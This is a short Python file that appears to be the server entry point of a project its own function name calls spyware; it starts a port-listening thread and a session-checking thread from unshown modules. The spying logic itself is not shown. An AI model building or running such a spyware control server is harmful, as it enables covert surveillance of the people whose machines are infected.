import threading

from SRC.Session import *
from SRC.Ecoute import *

def SpyWareServeur(PORT):
    Threading_Ecoute = threading.Thread(target=Ecoute, args=(PORT,))
    thread_SESSION = threading.Thread(target=VerificationSESSION)
    
    Threading_Ecoute.start()
    thread_SESSION.start()

    Threading_Ecoute.join()
    thread_SESSION.join()
    os._exit(0)
